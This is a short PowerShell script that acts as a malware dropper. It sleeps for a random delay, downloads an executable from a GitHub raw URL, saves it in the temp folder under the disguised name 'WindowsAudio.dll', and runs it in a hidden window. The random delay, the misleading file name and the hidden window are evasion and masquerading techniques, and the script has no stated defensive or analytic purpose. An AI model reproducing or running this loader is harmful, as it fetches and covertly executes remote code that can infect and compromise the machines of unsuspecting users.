Start-Sleep -Seconds (Get-Random -Min 30 -Max 300)
$url = "https://github.com/kokisko9/1144/raw/main/1114.exe"
$output = "$env:TEMP\WindowsAudio.dll"
(New-Object Net.WebClient).DownloadFile($url, $output)
Start-Process $output -WindowStyle Hidden
